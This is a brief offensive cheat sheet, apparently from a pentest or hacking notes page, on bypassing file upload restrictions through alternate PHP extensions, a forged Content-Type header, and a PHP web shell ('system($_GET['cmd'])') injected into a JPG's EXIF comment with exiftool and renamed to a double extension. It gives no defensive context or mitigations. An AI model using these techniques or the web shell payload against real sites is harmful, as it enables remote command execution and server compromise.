HOW TO BYPASS FILE UPLOAD RESTRICTIONS? 
 
1. Use alternate file extensions
php - .phtml, .php3, .php4, .php5, and .inc 
 
A website can blacklist .php extension but they didn't blacklist .php3
 
2. Change MIME type
a. Intercept file upload request
b. Replace: Content-type: application/x-php with Content-type: image/jpeg
 
3. EXIF comments
Inject PHP code inside exif data comments in JPG files: 
a. exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
b. mv file.jpg file.php.jpg
